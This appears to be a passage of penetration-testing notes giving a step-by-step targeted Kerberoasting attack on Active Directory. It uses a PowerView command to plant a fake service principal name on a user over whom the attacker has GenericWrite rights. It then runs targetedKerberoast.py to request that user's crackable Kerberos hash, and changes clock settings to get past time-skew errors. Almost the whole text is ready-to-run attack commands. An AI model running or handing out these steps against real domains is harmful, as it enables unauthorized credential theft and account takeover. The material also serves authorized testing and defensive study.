> For Generic Write permission over another user we can perform a targeted Kerberoasting attack using PowerView:

```
Set-ADUser -Identity <target_user> -ServicePrincipalNames @{Add="fake/kerberoast"}
```

> Now that the SPN name is set we can request the hash of the user with targetedkerberoast.py from GitHub:

```
python3 targetedKerberoast.py --dc-ip <dc_ip> -d <domainame> -u <user> -p "<password>" --request-user <target_user>
```

> If you get an error of clockskew too great, run the following:

```
sudo timedatectl set-ntp off 
sudo rdate -n <DC_ip>
```

> To revert back to normal after running the commands and getting the hash run:

```
sudo timedatectl set-ntp on
sudo timedatectl set-timezone <your_timezone>
```
